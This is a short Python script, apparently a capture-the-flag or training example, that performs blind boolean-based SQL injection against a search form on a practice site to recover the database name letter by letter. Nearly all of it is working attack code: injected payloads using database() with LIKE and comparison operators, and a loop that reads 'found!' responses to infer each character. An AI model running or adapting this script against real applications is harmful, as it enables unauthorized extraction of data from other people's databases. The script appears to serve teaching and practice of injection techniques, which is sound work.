# This is a barebones example of how to extract the current database name using sql injection
# when the only feedback the application gives is a count of records.

import requests  # http library to send requests to the site

# A function that will return True/False if the injected condition is true/false
def checkSuccess(search): 

    url = "http://problems.getpwning.com:7007/search.php"   # The target website
    postData = {"bagel": search}                            # The post data for the request

    r = requests.post (url, postData)                       # Make a POST request and get the response

    if "SQL query syntax error" in r.text:                  # If we passed a bad query break into the debugger so we can fix it
        breakpoint()
        
    return True if "found!" in r.text else False            # If the injected query returned rows the page will say there were bagles found.


# List of characters to search through
# This is just an example, if the name contains any letters outside this range this code will not work.
alphabet = "abcdefghijklmnopqrstuvwxyz"                     

databaseName = ""
length = 0

# Find how many characters are in the name by using LIKE '_%' and increasing the number of underscores until it fails.
for i in range(0,100):
    if checkSuccess(f"' OR database() LIKE '{'_' * i}%';-- "):
        length = i
        print(f"\r{length}", end="\r")
    else:
        break
print (f"Length is {length}")

# Find the character at each position by comparing the name with the letters we already know + 1 more letter,
# stepping through the alphabet until it fails - we then know the correct letter is the one before it failed.
for i in range(0,length):
    for c in range(0, len(alphabet)):
        print(f"\r{databaseName + alphabet[c]}", end="\r")
        if not checkSuccess(f"' OR database() >= '{databaseName + alphabet[c]}';-- "):
            databaseName += alphabet[c-1]
            print (databaseName)
            break

print (f"Database Name is {databaseName}")
